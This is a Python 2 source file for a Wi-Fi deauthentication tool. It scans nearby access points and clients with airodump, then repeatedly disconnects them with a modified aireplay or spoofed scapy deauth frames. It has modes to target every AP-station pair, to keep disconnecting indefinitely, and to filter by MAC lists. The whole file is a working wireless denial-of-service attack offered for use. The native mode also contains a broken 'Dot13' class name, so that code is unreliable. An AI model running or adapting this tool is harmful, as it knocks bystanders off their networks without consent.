#!/usr/bin/env python

import time
import subprocess
import signal
import sys
import getopt
import os
import traceback

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

class Scanner:
	def __init__(self):
		self.disconnect = None
		self.monitor = "mon0"
		self.scanner = None

		self.DEVNULL = open(os.devnull,"wb")
		self.channel = None
		
		self.aps = {}
		self.stations = {}
		self.station_list = []

	def init(self):
		remove = subprocess.Popen("rm -f dump-01.csv".split(),stdout=self.DEVNULL, stderr=self.DEVNULL)
		remove.wait()

		#scanner = subprocess.Popen("airodump-ng -c 1 -w dump --output-format=csv mon0".split(),stdout=self.DEVNULL, stderr=self.DEVNULL)
		cmd = "./airodump-mod --berlin 10 -w dump --output-format=csv " + self.monitor
		if self.channel != None:
			cmd = cmd + " -c " + self.channel
		print "starting scanner: > " + cmd
		self.scanner = subprocess.Popen(cmd.split(),stdout=self.DEVNULL, stderr=self.DEVNULL)

		time.sleep(3)

	def resetList(self):
		self.aps = {}
		self.stations = {}
		self.station_list = []

	def setChannel(self, channel):
		self.channel = channel

	def setMonitor(self, monitor):
		self.monitor = monitor

	def setDisconnect(self, disconnect):
		self.disconnect = disconnect

	def addAp(self, mac, channel):
		if self.aps.get(channel,None) is None:
			self.aps[channel] = []
		if mac not in self.aps[channel]:
			self.aps[channel].append(mac)
		
	def addStation(self,station, ap):
		if self.stations.get(ap,None) is None:
			self.stations[ap] = []
		if station not in self.stations[ap]:
			self.stations[ap].append(station)
		if station not in self.station_list:
			self.station_list.append(station)

	def readAps(self,line):
		if "," in line:
			splits = line.split(",")
			ap_mac = splits[0].strip()
			channel = splits[3].strip()
			self.addAp(ap_mac,channel)
			self.disconnect.addAp(ap_mac,channel)

	def readStations(self, line):
		if "," in line:
			splits = line.split(",")
			station_mac = splits[0].strip()
			station_ap = splits[5].strip()
			self.addStation(station_mac, station_ap)
			self.disconnect.addStation(station_mac, station_ap)

	def getAps(self):
		return self.aps

	def getStations(self):
		return self.stations

	def getStationList(self):
		return self.station_list

	def scan(self):
		if self.scanner.returncode != None:
			print "airodump has crashed"
			sys.exit(5)
		
		copy = subprocess.Popen("cp -f dump-01.csv output.csv".split(),stdout=self.DEVNULL, stderr=self.DEVNULL)
		copy.wait()
		file = open("output.csv","r")

		self.resetList()
		state = 0
		for line in file:
			if state == 0:
				if line.startswith("BSSID"):
					state = 1
					continue
			elif state == 1:
				if line.startswith("Station"):
					state = 2
					continue
				self.readAps(line)
			elif state == 2:
				self.readStations(line)

		file.close()

	def terminate(self):
		if self.scanner != None:
			print "Terminating scanner"
			self.scanner.terminate()

class DebugScanner(Scanner):
	def init(self):
		print "starting debug scanner"
		cmd = "./fake-scanner"
		self.scanner = subprocess.Popen(cmd.split(),stdout=self.DEVNULL, stderr=self.DEVNULL)


class DisconnectStrat:
	def __init__(self):
		self.monitor = "mon0"
		self.process = []

		self.monitors = 1
		self.logging = False
		self.DEVNULL = open(os.devnull,"wb")
		self.currentChannel = None

	def setMonitors(self, n):
		self.monitors = n
		
	def setMonitor(self, monitor):
		self.monitor = monitor

	def setLogging(self, logging):
		self.logging = logging

	def setPower(self, power):
		cmd ="iwconfig " + self.monitor + " txpower "+ str(power) 
		config_process = subprocess.Popen(cmd.split())
		config_process.wait()
		if config_process.returncode != 0:
			print "Error configuring power" 
			sys.exit(3)
		
	def setChannel(self, channel):
		if self.currentChannel == channel:
			return True
		
		for nmon in range(self.monitors):
			monitor = "mon" + str(nmon + 1)
			print "Set channel", channel, "in monitor", monitor
			cmd ="iwconfig " + monitor + " channel " + str(channel) 
			p = subprocess.Popen(cmd.split())
			p.wait()
			if p.returncode != 0:
				print "Error setting Channel", str(channel)
				return False
		self.currentChannel = channel
		return True
		
	def disconnectBroadcast(self, ap):
		print "disconnecting broadcast", ap

	def getDisconnectCommand(self, station, ap):
		cmd = "./aireplay-mod --deauth 1 -D -a " + ap + " -c " + station + " " + self.monitor
		return cmd
		
	def disconnectStation(self, station, ap):
		print "disconnecting", station, "from", ap, "in monitor:", self.monitor
		# cmd >> file.txt 2>&1 append to file and send stderr and stdout
		cmd = self.getDisconnectCommand(station,ap)
		if self.logging:
			filename = "disconnection." + station + "." + ap + ".log"
			cmd = cmd + " >> " + filename + " 2>&1"
			p = subprocess.Popen(cmd,shell=True)
		else:
			p = subprocess.Popen(cmd.split(), stdout=self.DEVNULL, stderr=self.DEVNULL)

		c = station
		self.process.append( (p,c) )
		return (p,c) 

	def waitTermination(self):
		for (p,c) in self.process:
			p.wait()
			# Returncode is None if the process has not terminated
			print "Disconnection for ", c, "ended with resultcode", p.returncode
			if p.returncode != 0:
				print "Program end with error"
				#print p.communication()[0]
				#print "End output:"
		self.process = []

	def terminate(self):
		for (p,c) in self.process:
			result = p.returncode
			if result == None:
				print("terminating", c," resultcode: ", p.returncode)
			else:
				print "Disconnection for ", c, "ended with resultcode", p.returncode
				p.terminate()	
		self.process = []

class DebugDisconnectStrat(DisconnectStrat):

	def setChannel(self,channel):
		return True

	def setPower(self,power):
		print "set power", power

	def getDisconnectCommand(self, station, ap):
		cmd = "./fake-disconnection"
		return cmd

class NativeDisconnectStrat(DisconnectStrat):

	def disconnectStation(self, station, ap):
		pckt = Dot11(addr1=station, addr2=ap, addr3=ap) / Dot11Deauth()
		cli_to_ap_pckt = None
		if station != 'FF:FF:FF:FF:FF:FF' : cli_to_ap_pckt = Dot13(addr1=ap, addr2=station, addr3=ap) / Dot11Deauth()
		print 'Sending Deauth to ' + station + ' from ' + ap
		for i in range(64):
			#  Send out deauth from the AP
			sendp(pckt,iface=self.monitor,verbose=False)
			# If we're targeting a client, we will also spoof deauth from the client to the AP
			if station != 'FF:FF:FF:FF:FF:FF': sendp(cli_to_ap_pckt,iface=self.monitor,verbose=False)

	def disconnectBroadcast(self, ap):
		pass

	def terminate(self):
		pass

class Disconnect:
	def __init__(self):
		self.whitelist = None
		self.blacklist = None
		self.power = None

		self.scanner = Scanner()
		self.strat = DisconnectStrat()

		self.aps = {}
		self.stations = {}
		self.station_list = []

		self.iface = ["wlan0"]
		self.scan_iface = "wlan0"
		self.channel = None
		self.aggressive = False
		self.remember = False

	def setRemember(self,remember):
		self.remember = remember

	def setAggressive(self,aggressive):
		self.aggressive = aggressive

	def setScanner(self,scanner):
		self.scanner = scanner

	def setStrat(self,strat):
		self.strat = strat

	def init(self):
		if self.power != None:
			self.strat.setPower(power)

		self.strat.setMonitor("mon1")
		self.scanner.setMonitor("mon0")
		self.scanner.setChannel(self.channel)
		self.scanner.init()

	def addAp(self, mac, channel):
		if self.aps.get(channel,None) is None:
			self.aps[channel] = []
		if mac not in self.aps[channel]:
			self.aps[channel].append(mac)
		
	def addStation(self,station, ap):
		if self.stations.get(ap,None) is None:
			self.stations[ap] = []
		if station not in self.stations[ap]:
			self.stations[ap].append(station)
		if station not in self.station_list:
			self.station_list.append(station)
		
	def setChannel(self,channel):
		self.channel = channel

	def scan(self):
		self.scanner.scan()
		
	def run(self):
		aps = self.aps
		station_list = self.station_list
		stations = self.stations
		if not self.remember:
			aps = self.scanner.getAps()
			station_list = self.scanner.getStationList()
			stations = self.scanner.getStations()

		for channel in aps:
			channelOk = self.strat.setChannel(channel)
			if not channelOk:
				continue

			n_monitor = 0
			for ap in aps[channel]:
				if self.whitelist and ap in self.whitelist or self.blacklist and ap not in self.blacklist:
					pass
				else:
					self.strat.disconnectBroadcast(ap)
					victim_list = []
					if self.aggressive:
						victim_list = station_list
					else:
						victim_list = stations.get(ap,[])
					
					for station in victim_list:
						n_monitor = (n_monitor % len(self.iface) ) + 1
						monitor = "mon" + str(n_monitor)
						self.strat.setMonitor(monitor)
						self.strat.disconnectStation(station,ap)

			#time.sleep(1.5)
			#self.strat.terminate()
			self.strat.waitTermination()

	def setWhitelist(self,whitelist):
		self.whitelist = whitelist

	def setBlacklist(self,blacklist):
		self.blacklist = blacklist

	def setPower(self,power):
		self.power = power

	def setScanIface(self,iface):
		self.scan_iface = iface

	def setIface(self,iface):
		self.iface = iface

	def start_monitors(self):
		self.start_monitor(self.scan_iface) #mon0
		for iface in self.iface:
			self.start_monitor(iface) #monX
	
	def start_monitor(self,iface):
		startmon_process = subprocess.Popen(("./start_monitors.sh "+iface).split())
		startmon_process.wait()
		if startmon_process.returncode != 0:
			print "Error starting monitors:"
			print startmon_process.communicate()[0]
			sys.exit(3)

	def stop_all_monitors(self):
		stopmon_process = subprocess.Popen("./stop_monitors.sh".split())
		stopmon_process.wait()
		if stopmon_process.returncode != 0:
			print "Error stopping monitors"
			print stopmon_process.communicate()[0]
			sys.exit(3)
		
	def terminate(self):
		self.strat.terminate()
		self.scanner.terminate()
		
def signal_handler(signal, frame):
	global disconnect
	print("exiting...")
	if disconnect:
		disconnect.terminate()
		disconnect = None
	print("exit ok")
	sys.exit(0)

def usage():
	print "usage:"
	print " > " + __file__ + " [-h] [-d] [-l] [-c channel] [-s scan_iface] [-i attack_iface[,iface2,iface3]] [-w whitelistfile] [-b blacklistfile] [-p power]"
	print " Options:"
	print "   -h: help"
	print "   -a: Aggresive mode, try every combination of ap-station"
	print "   -r: Remember, send disconnects forever once station has been spotted"
	print "   -n: Native mode instead of aireplay"
	print "   -D: Debug disconnector: Don't execute disconnection"
	print "   -d: Debug scanner: not a real scan, it gets the data from file \"dump-01.csv\"."
	print "       File format must be the same as the output of:"
	print "         > airodump-ng -w dump --output-format=csv mon0" 
	print "   -l: log into file \"disconnection.station.ap.log\""
	print "   -c: Channel to scan"
	print "   -s: Select scan interface"
	print "   -i: Select attack interface. it can be a comma-separated list"
	print "   -w: MACs Whitelist"
	print "   -b: MACs Blacklist."
	print "   -p: Power of the attack interface"

		
def build(argv):
	scan_iface = "wlan0"
	iface = ["wlan0"]
	whitelist = None
	blacklist = None
	power = None
	channel = None
	aggressive = False
	logging = False
	remember = False

	scanner = Scanner()
	strat = DisconnectStrat()

	try:
		opts, args = getopt.getopt(
					argv, 
					"harnDdls:i:w:b:p:c:", 
					["help","aggressive","remember","native","debug-disconnection","debug-scans","logging","debug", "iscan=", "iattack=", "whitelist=", "blacklist=", "power=", "channel="] )
	except getopt.GetoptError:
		usage()
		sys.exit(2)

	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit()
		elif opt in ("-a","--aggressive"):
			aggressive = True
		elif opt in ("-r","--remember"):
			remember = True
		elif opt in ("-n","--native"):
			strat = NativeDisconnectStrat()
		elif opt in ("-D","--debug-disconnection"):
			strat = DebugDisconnectStrat()
		elif opt in ("-d","--debug-scan"):
			scanner = DebugScanner()
		elif opt in ("-l","--logging"):
			logging = True
		elif opt in ("-c","--channel"):
			channel = arg
		elif opt in ("-s","--iscan"):
			scan_iface = arg	
		elif opt in ("-i","--iattack"):
			iface = arg.split(",")	
		elif opt in ("-w", "--whitelist"):
			cmd = "cat "+arg
			whitelist = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE).communicate()[0]
		elif opt in ("-b", "--blacklist"):
			cmd = "cat "+arg
			blacklist = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE).communicate()[0]
		elif opt in ("-p", "--power"):
			power = int(arg)

	disconnect = Disconnect()

	scanner.setDisconnect(disconnect)
	disconnect.setScanner(scanner)
	
	strat.setLogging(logging)
	strat.setMonitors(len(iface))
	disconnect.setStrat(strat)

	disconnect.setRemember(remember)
	disconnect.setAggressive(aggressive)
	disconnect.setWhitelist(whitelist)
	disconnect.setBlacklist(blacklist)
	disconnect.setPower(power)
	disconnect.setChannel(channel)
	disconnect.setScanIface(scan_iface)
	disconnect.setIface(iface)

	return disconnect

def main(argv):
	global disconnect
	disconnect = build(argv)

	signal.signal(signal.SIGINT, signal_handler)

	try:
		disconnect.stop_all_monitors()
		disconnect.start_monitors()

		disconnect.init()

		while True:

			disconnect.scan()
				
			disconnect.run()
	except:
		if disconnect:
			disconnect.terminate()
			disconnect = None
		traceback.print_exc(file=sys.stdout)

if __name__ == "__main__":
	main(sys.argv[1:])
